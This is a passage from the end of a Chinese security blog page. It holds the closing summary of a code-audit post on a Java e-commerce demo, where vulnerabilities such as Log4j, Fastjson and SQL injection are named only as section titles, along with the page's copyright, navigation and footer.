点聚焦于Log4j2shell的代码审计。,文章详细阐述了项目环境、组件漏洞审计、特别是Fastjson、Log4j和Mybatis的漏洞分析，以及如何通过渗透测试验证这些漏洞。</a> 通过代码审计，发现存在Fastjson反序列化、Log4j远程代码执行和SQL注入等漏洞，并提供了漏洞验证的方法。)</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://timind-sec.github.io">Timind</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://timind-sec.github.io/posts/8e2aa821/">http://timind-sec.github.io/posts/8e2aa821/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://timind-sec.github.io" target="_blank">Timind's café</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/d57df2e9/" title="关于k8s攻防的随笔"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">关于k8s攻防的随笔</div></div><div class="info-2"><div class="info-item-1">k8s攻击思路：视频链接：【【小迪安全】全栈网络安全 | 渗透测试 | 高级红蓝对抗 V2024最新版 (完)】 https://www.bilibili.com/video/BV123yAYMEwb/?p=98&amp;share_source=copy_web&amp;vd_source=5a6a99263af87e552e4139cdec53fd37 &lt;又是师从小迪的一天&gt; 参考文章链接：https://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ?scene=1  这张图片很好的展示了红队视角下的k8s架构，可以从api-server开始进行攻击： 1. 攻击点 1~4：攻击K8S组件 K8S 组件的问题主要是指各组件的不安全配置，攻击点1~4罗列了4个比较有代表性的组件问题，即 API Server 未授权访问、etcd 未授权访问、kubelet 未授权访问、kube-proxy 不安全配置。 除此之外，还有很多组件都存在着类似的安全问题，比如 dashboard、docker 等组件也存在未授权访问的隐患，这些都是 ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Timind</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%A1%B9%E7%9B%AE%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">一、项目介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2"><span class="toc-number">2.</span> <span class="toc-text">二、项目部署</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.</span> <span class="toc-text">三、代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E7%BB%84%E4%BB%B6%E5%AE%A1%E8%AE%A1%E2%80%93fastjson"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">1、组件审计–fastjson</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">2、log4j远程代码执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">3、任意文件上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E4%B8%8D%E8%A7%84%E8%8C%83%E7%9A%84mybatis%E5%86%99%E6%B3%95%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">4、不规范的mybatis写法导致sql注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.4.</span> <span class="toc-text">5、XSS漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">3.5.</span> <span class="toc-text">三、渗透测试流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.6.</span> <span class="toc-text">1、fastjson远程代码执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-1"><span class="toc-number">3.7.</span> <span class="toc-text">2、log4j远程代码执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-1"><span class="toc-number">3.8.</span> <span class="toc-text">3、任意文件上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E4%B8%8D%E8%A7%84%E8%8C%83%E7%9A%84mybatis%E5%86%99%E6%B3%95%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-1"><span class="toc-number">3.9.</span> <span class="toc-text">4、不规范的mybatis写法导致sql注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81XSS%E6%BC%8F%E6%B4%9E-1"><span class="toc-number">3.10.</span> <span class="toc-text">5、XSS漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">四、总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/8e2aa821/" title="新手系列--迷你天猫商城系统代码审计流程">新手系列--迷你天猫商城系统代码审计流程</a><time datetime="2025-12-26T13:26:21.000Z" title="发表于 2025-12-26 21:26:21">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/d57df2e9/" title="关于k8s攻防的随笔">关于k8s攻防的随笔</a><time datetime="2025-11-18T14:07:04.000Z" title="发表于 2025-11-18 22:07:04">2025-11-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/89a18773/" title="java反序列化之cc1链分析">java反序列化之cc1链分析</a><time datetime="2025-11-08T07:43:28.000Z" title="发表于 2025-11-08 15:43:28">2025-11-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/c74d1264/" title="浅谈pyramid框架下的栈帧逃逸">浅谈pyramid框架下的栈帧逃逸</a><time datetime="2025-11-07T17:55:14.000Z" title="发表于 2025-11-08 01:55:14">2025-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Timind</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
